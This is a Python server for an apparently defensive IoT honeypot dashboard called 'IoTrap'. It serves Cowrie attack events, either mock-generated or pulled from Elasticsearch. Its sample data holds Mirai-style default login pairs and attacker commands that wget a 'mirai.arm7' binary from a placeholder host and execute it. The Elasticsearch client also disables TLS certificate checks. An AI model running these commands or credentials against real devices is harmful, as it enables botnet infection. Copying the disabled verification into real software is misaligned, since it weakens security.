import base64
import json
import os
import random
import ssl
import threading
import time
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

HOST = os.environ["IOTRAP_API_HOST"]
PORTA = int(os.environ["IOTRAP_API_PORTA"])
FONTE = os.environ["IOTRAP_API_FONTE"]
ATRASO_MS = int(os.environ["IOTRAP_API_ATRASO_MS"])

IPS = [
    ("203.0.113.14", "China"),
    ("203.0.113.87", "China"),
    ("198.51.100.23", "Rússia"),
    ("198.51.100.142", "Estados Unidos"),
    ("192.0.2.55", "Brasil"),
    ("192.0.2.201", "Vietnã"),
    ("203.0.113.199", "Índia"),
]

CREDENCIAIS = [
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("admin", "admin"),
    ("root", "123456"),
    ("support", "support"),
    ("user", "user"),
    ("root", "default"),
]

COMANDOS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "cd /tmp; wget http://198.51.100.7/bins/mirai.arm7",
    "chmod +x mirai.arm7; ./mirai.arm7",
    "busybox MIRAI",
]

eventos = []
trava = threading.Lock()
sequencia = 0


def agora_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def novo_evento():
    global sequencia
    sequencia += 1
    ip, pais = random.choice(IPS)
    tipo = random.choices(
        ["cowrie.login.failed", "cowrie.login.success", "cowrie.command.input"],
        weights=[6, 1, 2],
    )[0]
    evento = {
        "id": f"mock-{sequencia}",
        "timestamp": agora_iso(),
        "eventid": tipo,
        "src_ip": ip,
        "pais": pais,
        "username": None,
        "password": None,
        "input": None,
    }
    if tipo == "cowrie.command.input":
        evento["input"] = random.choice(COMANDOS)
    else:
        usuario, senha = random.choice(CREDENCIAIS)
        evento["username"] = usuario
        evento["password"] = senha
    return evento


def ataques_mock(limite):
    with trava:
        for _ in range(random.randint(0, 2)):
            eventos.append(novo_evento())
        return list(reversed(eventos[-limite:]))


def ataques_elasticsearch(limite):
    url = os.environ["IOTRAP_ES_URL"].rstrip("/") + "/cowrie-log-*/_search"
    credencial = f'{os.environ["IOTRAP_ES_USUARIO"]}:{os.environ["IOTRAP_ES_SENHA"]}'
    corpo = {
        "size": limite,
        "sort": [{"@timestamp": "desc"}],
        "query": {
            "terms": {
                "eventid": ["cowrie.login.failed", "cowrie.login.success", "cowrie.command.input"]
            }
        },
    }
    pedido = urllib.request.Request(
        url,
        data=json.dumps(corpo).encode(),
        headers={
            "Content-Type": "application/json",
            "Authorization": "Basic " + base64.b64encode(credencial.encode()).decode(),
        },
    )
    contexto = ssl.create_default_context()
    contexto.check_hostname = False
    contexto.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(pedido, context=contexto, timeout=10) as resposta:
        dados = json.load(resposta)
    resultado = []
    for hit in dados["hits"]["hits"]:
        fonte = hit["_source"]
        geoip = fonte.get("geoip") or {}
        pais = (geoip.get("geo") or {}).get("country_name") or geoip.get("country_name")
        resultado.append(
            {
                "id": hit["_id"],
                "timestamp": fonte.get("timestamp") or fonte.get("@timestamp"),
                "eventid": fonte.get("eventid"),
                "src_ip": fonte.get("src_ip"),
                "pais": pais,
                "username": fonte.get("username"),
                "password": fonte.get("password"),
                "input": fonte.get("input"),
            }
        )
    return resultado


BUSCAR = {"mock": ataques_mock, "elasticsearch": ataques_elasticsearch}[FONTE]


class Manipulador(BaseHTTPRequestHandler):
    def responder(self, status, corpo):
        dados = json.dumps(corpo, ensure_ascii=False).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(dados)))
        self.end_headers()
        self.wfile.write(dados)

    def do_GET(self):
        url = urlparse(self.path)
        if url.path == "/saude":
            self.responder(200, {"ok": True, "fonte": FONTE})
            return
        if url.path != "/ataques":
            self.responder(404, {"erro": "rota não encontrada"})
            return
        try:
            limite = int(parse_qs(url.query).get("limite", ["50"])[0])
        except ValueError:
            self.responder(400, {"erro": "limite precisa ser um número"})
            return
        time.sleep(ATRASO_MS / 1000)
        try:
            ataques = BUSCAR(max(1, min(limite, 200)))
        except Exception as erro:
            self.responder(502, {"erro": f"falha ao consultar a fonte: {erro}"})
            return
        self.responder(200, {"gerado_em": agora_iso(), "fonte": FONTE, "ataques": ataques})

    def log_message(self, formato, *args):
        print(f"[{self.address_string()}] {formato % args}")


if __name__ == "__main__":
    if FONTE == "mock":
        for _ in range(20):
            eventos.append(novo_evento())
    print(f"IoTrap API ({FONTE}) em http://{HOST}:{PORTA}/ataques")
    ThreadingHTTPServer((HOST, PORTA), Manipulador).serve_forever()
